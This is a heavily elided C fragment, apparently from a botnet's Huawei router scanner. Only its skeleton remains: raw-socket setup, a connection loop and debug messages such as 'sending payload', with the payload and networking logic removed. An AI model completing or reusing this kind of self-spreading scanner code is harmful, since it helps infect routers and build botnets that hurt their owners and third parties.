...
void huaweiscanner_scanner_init(void)
{
    ...
    {
        #ifdef DEBUG
            printf("[HuaweiRep] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    ...
    {
        #ifdef DEBUG
            printf("[HuaweiRep] failed to set IP_HDRINCL, cannot scan\n");
        #endif
    ...
    #ifdef DEBUG
        printf("[HuaweiRep] scanner process initialized. scanning started.\n");
    #endif
        ...
        for(i = 0; i < huaweiscanner_SCANNER_MAX_CONNS; i++)
        {
            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    ...
                    {
                        #ifdef DEBUG
                            printf("[HuaweiRep] FD%d sending payload\n", conn->fd);
                        #endif
                    ...
                    {
                        #ifdef DEBUG
                            printf("[HuaweiRep] FD%d finished\n", conn->fd);
                        #endif
